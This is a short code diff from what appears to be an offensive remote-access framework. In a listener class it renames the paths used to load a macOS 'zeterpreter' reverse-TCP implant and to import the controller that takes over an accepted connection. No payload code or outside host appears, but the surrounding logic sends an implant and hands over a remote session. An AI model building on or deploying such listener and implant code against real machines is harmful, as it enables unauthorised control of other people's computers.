@@ -62,8 +62,8 @@ class listener:
                 sys.exit()
 
             print(self.badges.G + "Sending macOS implant...")
-            if os.path.exists("data/macos/reverse_tcp/zeterpreter/zeterpreter"):
-                implant_file = open("data/macos/reverse_tcp/zeterpreter/zeterpreter", "rb")
+            if os.path.exists("data/macos/zeterpreter/reverse_tcp/zeterpreter"):
+                implant_file = open("data/macos/zeterpreter/reverse_tcp/zeterpreter", "rb")
                 executable = implant_file.read()
                 implant_file.close()
                 instructions = ""
@@ -83,7 +83,7 @@ class listener:
             print(self.badges.G + "Establishing connection...")
             client, address = server.accept()
             
-            from data.macos.reverse_tcp.zeterpreter.core.controller import controller
+            from data.macos.zeterpreter.reverse_tcp.core.controller import controller
             controller = controller(client)
             
             return controller
